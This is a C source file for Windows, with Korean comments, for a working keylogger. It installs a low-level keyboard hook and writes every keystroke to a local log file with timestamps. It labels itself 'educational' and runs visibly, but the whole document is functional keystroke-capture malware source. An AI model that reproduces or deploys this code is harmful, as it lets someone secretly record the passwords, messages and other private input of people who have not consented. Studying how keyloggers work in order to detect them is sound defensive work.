#include <windows.h>
#include <stdio.h>
#include <time.h>

// 로그 파일 경로
#define LOG_FILE "logs\\keylog.txt"

// 후킹 핸들
HHOOK hKeyboardHook;
FILE *logFile;

// 키 이름 매핑
const char* GetKeyName(int vkCode) {
    switch(vkCode) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SPACE: return " ";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        default: return NULL;
    }
}

// 현재 시간 가져오기
void LogTimestamp() {
    time_t now;
    time(&now);
    char* timeStr = ctime(&now);
    timeStr[strlen(timeStr) - 1] = '\0'; // 개행 제거
    fprintf(logFile, "\n[%s] ", timeStr);
    fflush(logFile);
}

// 키보드 후킹 콜백 함수
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        int vkCode = kbStruct->vkCode;
        
        // 로그 파일 열기
        logFile = fopen(LOG_FILE, "a");
        if (logFile == NULL) {
            return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
        }
        
        // 특수 키 처리
        const char* keyName = GetKeyName(vkCode);
        if (keyName != NULL) {
            fprintf(logFile, "%s", keyName);
        }
        // 일반 문자 키
        else if (vkCode >= 0x30 && vkCode <= 0x5A) {
            // Shift 키 눌림 확인
            BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
            BOOL capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
            
            char key = vkCode;
            
            // 대소문자 처리
            if (vkCode >= 0x41 && vkCode <= 0x5A) { // A-Z
                if (!(shift ^ capsLock)) {
                    key = key + 32; // 소문자로
                }
            }
            
            fprintf(logFile, "%c", key);
        }
        
        fflush(logFile);
        fclose(logFile);
    }
    
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int main() {
    printf("=================================\n");
    printf("Educational Keylogger Started\n");
    printf("=================================\n");
    printf("WARNING: For educational purposes only!\n");
    printf("Press Ctrl+C to stop...\n\n");
    
    // 로그 디렉토리 생성
    CreateDirectory("logs", NULL);
    
    // 시작 시간 기록
    logFile = fopen(LOG_FILE, "a");
    if (logFile) {
        LogTimestamp();
        fprintf(logFile, "Keylogger started\n");
        fclose(logFile);
    }
    
    // 키보드 후킹 설정
    hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyboardProc,
        NULL,
        0
    );
    
    if (hKeyboardHook == NULL) {
        printf("Failed to install hook! Error: %lu\n", GetLastError());
        return 1;
    }
    
    printf("Keylogger is running...\n");
    printf("Log file: %s\n\n", LOG_FILE);
    
    // 메시지 루프
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // 후킹 해제
    UnhookWindowsHookEx(hKeyboardHook);
    
    printf("Keylogger stopped.\n");
    return 0;
}
